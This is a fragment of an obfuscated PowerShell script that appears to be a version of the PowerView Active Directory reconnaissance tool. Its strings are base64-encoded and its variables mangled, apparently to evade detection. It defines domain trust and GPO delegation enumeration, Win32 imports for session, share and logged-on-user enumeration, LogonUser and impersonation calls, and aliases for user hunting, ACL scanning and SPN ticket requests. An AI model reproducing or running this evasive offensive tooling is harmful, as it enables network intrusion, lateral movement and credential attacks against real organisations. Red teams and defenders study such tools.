        if ($Domain -and ($Domain.Trim() -ne '') -and (-not ${___/=\/\/=\/\_/\/}.ContainsKey($Domain))) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIABFAG4AdQBtAGUAcgBhAHQAaQBuAGcAIAB0AHIAdQBzAHQAcwAgAGYAbwByACAAZABvAG0AYQBpAG4AOgAgACcAJABEAG8AbQBhAGkAbgAnAA==')))
            $Null = ${___/=\/\/=\/\_/\/}.Add($Domain, '')
            try {
                ${_/\/=====\/==\/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
                ${_/\/=\_/====\/=\_} = _/==\/\___/\_/==\_ @_/\/=====\/==\/==
                if (${_/\/=\_/====\/=\_} -isnot [System.Array]) {
                    ${_/\/=\_/====\/=\_} = @(${_/\/=\_/====\/=\_})
                }
                if ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))) {
                    ${/=\/\___/==\/===\} = @{}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${/=\/\___/==\/===\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\/\___/==\/===\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    ${_/\/=\_/====\/=\_} += __/=\/==\/=\__/==\ @/=\/\___/==\/===\
                }
                if (${_/\/=\_/====\/=\_}) {
                    if (${_/\/=\_/====\/=\_} -isnot [System.Array]) {
                        ${_/\/=\_/====\/=\_} = @(${_/\/=\_/====\/=\_})
                    }
                    ForEach (${__/==\/\/==\/===\} in ${_/\/=\_/====\/=\_}) {
                        if (${__/==\/\/==\/===\}.SourceName -and ${__/==\/\/==\/===\}.TargetName) {
                            $Null = ${___/==\___/\__/\/}.Push(${__/==\/\/==\/===\}.TargetName)
                            ${__/==\/\/==\/===\}
                        }
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABNAGEAcABwAGkAbgBnAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
            }
        }
    }
}
function Get-GPODelegation {
    [CmdletBinding()]
    Param (
        [String]
        $GPOName = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    ${/======\_/\_/\___} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBZAFMAVABFAE0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABBAGQAbQBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEEAZABtAGkAbgBzAA=='))))
    $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    ${____/\/=\/=\_/===} = @($Forest.Domains)
    ${___/==\___/\__/\/} = ${____/\/=\/=\_/===} | foreach { $_.GetDirectoryEntry() }
    foreach ($Domain in ${___/==\___/\__/\/}) {
        $Filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAEcAUABPAE4AYQBtAGUAKQApAA==')))
        ${__/=\_/=\/\__/\/\} = New-Object System.DirectoryServices.DirectorySearcher
        ${__/=\_/=\/\__/\/\}.SearchRoot = $Domain
        ${__/=\_/=\/\__/\/\}.Filter = $Filter
        ${__/=\_/=\/\__/\/\}.PageSize = $PageSize
        ${__/=\_/=\/\__/\/\}.SearchScope = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAdAByAGUAZQA=')))
        ${/==\_/=\/\/=\/\/=} = ${__/=\_/=\/\__/\/\}.FindAll()
        foreach (${/===\/\_/\__/==\/} in ${/==\_/=\/\/=\/\/=}){
            ${___/=\/\/===\___/} = ([ADSI]${/===\/\_/\__/==\/}.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA=='))) -and $_.AccessControlType -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA=='))) -and  ${/======\_/\_/\___} -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAE8AUgAgAE8AVwBOAEUAUgA=')))}
        if (${___/=\/\/===\___/} -ne $null){
            ${/====\/=\__/=\/\/} = New-Object psobject
            ${/====\/=\__/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAFMAUABhAHQAaAA='))) ${/===\/\_/\__/==\/}.Properties.adspath
            ${/====\/=\__/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${/===\/\_/\__/==\/}.Properties.displayname
            ${/====\/=\__/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AFIAZQBmAGUAcgBlAG4AYwBlAA=='))) ${___/=\/\/===\___/}.IdentityReference
            ${/====\/=\__/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) ${___/=\/\/===\___/}.ActiveDirectoryRights
            ${/====\/=\__/=\/\/}
        }
        }
    }
}
${/=\/=\_/==\/=\/\_} = ____/=\_____/===== -_/=\__/\/\/==\/\/\ Win32
${____/\/===\____/\} = ____/==\__/\/\/\/\ ${/=\/=\_/==\/=\/\_} PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMAA=')))
    GROUP_OBJECT                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA=')))
    NON_SECURITY_GROUP_OBJECT       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMQA=')))
    ALIAS_OBJECT                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA=')))
    NON_SECURITY_ALIAS_OBJECT       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMQA=')))
    USER_OBJECT                     =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMAA=')))
    MACHINE_ACCOUNT                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMQA=')))
    TRUST_ACCOUNT                   =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADMAMAAwADAAMAAwADAAMgA=')))
    APP_BASIC_GROUP                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA=')))
    APP_QUERY_GROUP                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMQA=')))
    ACCOUNT_TYPE_MAX                =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADcAZgBmAGYAZgBmAGYAZgA=')))
}
${/=====\_/\_____/\} = ____/==\__/\/\/\/\ ${/=\/=\_/==\/=\/\_} PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA=')))
    GLOBAL_SCOPE                    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA=')))
    DOMAIN_LOCAL_SCOPE              =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA=')))
    UNIVERSAL_SCOPE                 =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA=')))
    APP_BASIC                       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA=')))
    APP_QUERY                       =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA=')))
    SECURITY                        =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA=')))
} -__/=\/\_/=\/=\_/==
${/==\_/\/\___/\___} = ____/==\__/\/\/\/\ ${/=\/=\_/==\/=\/\_} PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -__/=\/\_/=\/=\_/==
${__/==\_/\/=\__/==} = ____/==\__/\/\/\/\ ${/=\/=\_/==\/=\/\_} WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
${/===\/\___/\_/===} = ____/=\__/===\_/\_ ${/=\/=\_/==\/=\/\_} PowerView.RDPSessionInfo @{
    ExecEnvId = __/\____/=\____/\/ 0 UInt32
    State = __/\____/=\____/\/ 1 ${__/==\_/\/=\__/==}
    SessionId = __/\____/=\____/\/ 2 UInt32
    pSessionName = __/\____/=\____/\/ 3 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pHostName = __/\____/=\____/\/ 4 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pUserName = __/\____/=\____/\/ 5 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pDomainName = __/\____/=\____/\/ 6 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    pFarmName = __/\____/=\____/\/ 7 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${/==\_/\/\_/\/\/\/} = ____/=\__/===\_/\_ ${/=\/=\_/==\/=\/\_} WTS_CLIENT_ADDRESS @{
    AddressFamily = __/\____/=\____/\/ 0 UInt32
    Address = __/\____/=\____/\/ 1 Byte[] -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AFYAYQBsAEEAcgByAGEAeQA='))), 20)
}
${__/==\__/=\/=\___} = ____/=\__/===\_/\_ ${/=\/=\_/==\/=\/\_} PowerView.ShareInfo @{
    Name = __/\____/=\____/\/ 0 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Type = __/\____/=\____/\/ 1 UInt32
    Remark = __/\____/=\____/\/ 2 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${___/=\_/==\/\/\/=} = ____/=\__/===\_/\_ ${/=\/=\_/==\/=\/\_} PowerView.LoggedOnUserInfo @{
    UserName = __/\____/=\____/\/ 0 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    LogonDomain = __/\____/=\____/\/ 1 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    AuthDomains = __/\____/=\____/\/ 2 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    LogonServer = __/\____/=\____/\/ 3 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${______/=\/\_/\_/=} = ____/=\__/===\_/\_ ${/=\/=\_/==\/=\/\_} PowerView.SessionInfo @{
    CName = __/\____/=\____/\/ 0 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    UserName = __/\____/=\____/\/ 1 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Time = __/\____/=\____/\/ 2 UInt32
    IdleTime = __/\____/=\____/\/ 3 UInt32
}
${/=====\/======\_/} = ____/==\__/\/\/\/\ ${/=\/=\_/==\/=\/\_} SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
${__/\_/=======\_/=} = ____/=\__/===\_/\_ ${/=\/=\_/==\/=\/\_} LOCALGROUP_INFO_1 @{
    lgrpi1_name = __/\____/=\____/\/ 0 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lgrpi1_comment = __/\____/=\____/\/ 1 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${_/\/\_/\_____/===} = ____/=\__/===\_/\_ ${/=\/=\_/==\/=\/\_} LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = __/\____/=\____/\/ 0 IntPtr
    lgrmi2_sidusage = __/\____/=\____/\/ 1 ${/=====\/======\_/}
    lgrmi2_domainandname = __/\____/=\____/\/ 2 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${_____/\/===\/=\/=} = ____/==\__/\/\/\/\ ${/=\/=\_/==\/=\/\_} DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -__/=\/\_/=\/=\_/==
${__/====\______/\_} = ____/==\__/\/\/\/\ ${/=\/=\_/==\/=\/\_} DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
${_/=\_____/\__/==\} = ____/==\__/\/\/\/\ ${/=\/=\_/==\/=\/\_} DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
${/=\__/\/\/\_/\_/\} = ____/=\__/===\_/\_ ${/=\/=\_/==\/=\/\_} DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = __/\____/=\____/\/ 0 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    DnsDomainName = __/\____/=\____/\/ 1 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    Flags = __/\____/=\____/\/ 2 ${_____/\/===\/=\/=}
    ParentIndex = __/\____/=\____/\/ 3 UInt32
    TrustType = __/\____/=\____/\/ 4 ${__/====\______/\_}
    TrustAttributes = __/\____/=\____/\/ 5 ${_/=\_____/\__/==\}
    DomainSid = __/\____/=\____/\/ 6 IntPtr
    DomainGuid = __/\____/=\____/\/ 7 Guid
}
${____/\_/\______/\} = ____/=\__/===\_/\_ ${/=\/=\_/==\/=\/\_} NETRESOURCEW @{
    dwScope =         __/\____/=\____/\/ 0 UInt32
    dwType =          __/\____/=\____/\/ 1 UInt32
    dwDisplayType =   __/\____/=\____/\/ 2 UInt32
    dwUsage =         __/\____/=\____/\/ 3 UInt32
    lpLocalName =     __/\____/=\____/\/ 4 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpRemoteName =    __/\____/=\____/\/ 5 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpComment =       __/\____/=\____/\/ 6 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
    lpProvider =      __/\____/=\____/\/ 7 String -__/=\_/===\_/\/==\ @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABQAFcAUwB0AHIA'))))
}
${__/\/\____/\_/\__} = @(
    (__/\_/\__/==\/=\_/ netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (__/\_/\__/==\/=\_/ netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (__/\_/\__/==\/=\_/ netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (__/\_/\__/==\/=\_/ netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (__/\_/\__/==\/=\_/ netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (__/\_/\__/==\/=\_/ netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (__/\_/\__/==\/=\_/ netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (__/\_/\__/==\/=\_/ netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (__/\_/\__/==\/=\_/ advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -_/=\_/====\__/\_/=),
    (__/\_/\__/==\/=\_/ advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -_/=\_/====\__/\_/=),
    (__/\_/\__/==\/=\_/ advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (__/\_/\__/==\/=\_/ advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -_/=\_/====\__/\_/=),
    (__/\_/\__/==\/=\_/ advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -_/=\_/====\__/\_/=),
    (__/\_/\__/==\/=\_/ advapi32 RevertToSelf ([Bool]) @() -_/=\_/====\__/\_/=),
    (__/\_/\__/==\/=\_/ wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (__/\_/\__/==\/=\_/ wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -_/=\_/====\__/\_/=),
    (__/\_/\__/==\/=\_/ wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -_/=\_/====\__/\_/=),
    (__/\_/\__/==\/=\_/ wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (__/\_/\__/==\/=\_/ wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (__/\_/\__/==\/=\_/ wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (__/\_/\__/==\/=\_/ Mpr WNetAddConnection2W ([Int]) @(${____/\_/\______/\}, [String], [String], [UInt32])),
    (__/\_/\__/==\/=\_/ Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (__/\_/\__/==\/=\_/ kernel32 CloseHandle ([Bool]) @([IntPtr]) -_/=\_/====\__/\_/=)
)
${/=\/===\_/\_/\___} = ${__/\/\____/\_/\__} | __/\/===\/=\_/==== -_/===\/\/\_/\_/=\/ ${/=\/=\_/==\/=\/\_} -__/\/\__/=\____/\/ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAA==')))
${_/=\/\/===\/\___/} = ${/=\/===\_/\_/\___}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAYQBwAGkAMwAyAA==')))]
${/\____/=\/\/=\/\_} = ${/=\/===\_/\_/\___}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAHYAYQBwAGkAMwAyAA==')))]
${/==\_/=\/===\/\__} = ${/=\/===\_/\_/\___}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwB0AHMAYQBwAGkAMwAyAA==')))]
${/=\_/========\/\/} = ${/=\/===\_/\_/\___}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBwAHIA')))]
${_/\_/=\/====\/\/=} = ${/=\/===\_/\_/\___}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAA==')))]
sal Get-IPAddress Resolve-IPAddress
sal Convert-NameToSid ConvertTo-SID
sal Convert-SidToName ConvertFrom-SID
sal Request-SPNTicket Get-DomainSPNTicket
sal Get-DNSZone Get-DomainDNSZone
sal Get-DNSRecord Get-DomainDNSRecord
sal Get-NetDomain Get-Domain
sal Get-NetDomainController Get-DomainController
sal Get-NetForest Get-Forest
sal Get-NetForestDomain Get-ForestDomain
sal Get-NetForestCatalog Get-ForestGlobalCatalog
sal Get-NetUser Get-DomainUser
sal Get-UserEvent Get-DomainUserEvent
sal Get-NetComputer Get-DomainComputer
sal Get-ADObject Get-DomainObject
sal Set-ADObject Set-DomainObject
sal Get-ObjectAcl Get-DomainObjectAcl
sal Add-ObjectAcl Add-DomainObjectAcl
sal Invoke-ACLScanner Find-InterestingDomainAcl
sal Get-GUIDMap Get-DomainGUIDMap
sal Get-NetOU Get-DomainOU
sal Get-NetSite Get-DomainSite
sal Get-NetSubnet Get-DomainSubnet
sal Get-NetGroup Get-DomainGroup
sal Find-ManagedSecurityGroups Get-DomainManagedSecurityGroup
sal Get-NetGroupMember Get-DomainGroupMember
sal Get-NetFileServer Get-DomainFileServer
sal Get-DFSshare Get-DomainDFSShare
sal Get-NetGPO Get-DomainGPO
sal Get-NetGPOGroup Get-DomainGPOLocalGroup
sal Find-GPOLocation Get-DomainGPOUserLocalGroupMapping
sal Find-GPOComputerAdmin Get-DomainGPOComputerLocalGroupMapping
sal Get-LoggedOnLocal Get-RegLoggedOn
sal Invoke-CheckLocalAdminAccess Test-AdminAccess
sal Get-SiteName Get-NetComputerSiteName
sal Get-Proxy Get-WMIRegProxy
sal Get-LastLoggedOn Get-WMIRegLastLoggedOn
sal Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
sal Get-RegistryMountedDrive Get-WMIRegMountedDrive
sal Get-NetProcess Get-WMIProcess
sal Invoke-ThreadedFunction New-ThreadedFunction
sal Invoke-UserHunter Find-DomainUserLocation
sal Invoke-ProcessHunter Find-DomainProcess
sal Invoke-EventHunter Find-DomainUserEvent
sal Invoke-ShareFinder Find-DomainShare
sal Invoke-FileFinder Find-InterestingDomainShareFile
sal Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
sal Get-NetDomainTrust Get-DomainTrust
sal Get-NetForestTrust Get-ForestTrust
sal Find-ForeignUser Get-DomainForeignUser
sal Find-ForeignGroup Get-DomainForeignGroupMember
sal Invoke-MapDomainTrust Get-DomainTrustMapping
sal Get-DomainPolicy Get-DomainPolicyData
